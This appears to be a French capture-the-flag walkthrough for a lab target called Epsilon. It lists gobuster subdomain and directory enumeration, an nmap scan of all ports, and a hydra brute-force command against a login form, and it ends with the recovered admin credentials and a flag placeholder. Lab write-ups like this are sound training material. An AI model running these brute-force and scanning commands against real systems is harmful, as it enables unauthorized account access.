# Epsilon

1) Chercher les sous domaines avec gobuster

```bash
gobuster dns -d rs.io -w hacker-toolkit/wordlists/common_subdomains.txt
```

2) Trouver le sous domaine `epsilon.rs.io`

3) Scan de port avec nmap sur le sous domaine

```bash
nmap -sV -p- epsilon.rs.io
```

4) On trouve le port 6723 ouvert

5) On ouvre un navigateur sur le port 6723 et on trouve un site web

6) On exécute un gobuster sur le site web

```bash
gobuster dir -u http://epsilon.rs.io:6723 -w hacker-toolkit/wordlists/common_urls.txt
```

7) On trouve un chemin `/support_login` contenant un formulaire de login avec un champ `username` et `password`

8) On lance une attaque avec hydra

```bash
hydra -L wordlists/leaked_users.txt -P wordlists/leaked_passwords.txt 192.168.30.6 -s 6723 http-form-post "/support_login:username=^USER^&password=^PASS^:Invalid credentials"
```

9) On trouve le couple `administrator:jayden12345`

10) On se connecte sur le site avec le couple `administrator:jayden12345`

11) On trouve le flag

### Flag = ${FLAG_BruteForced}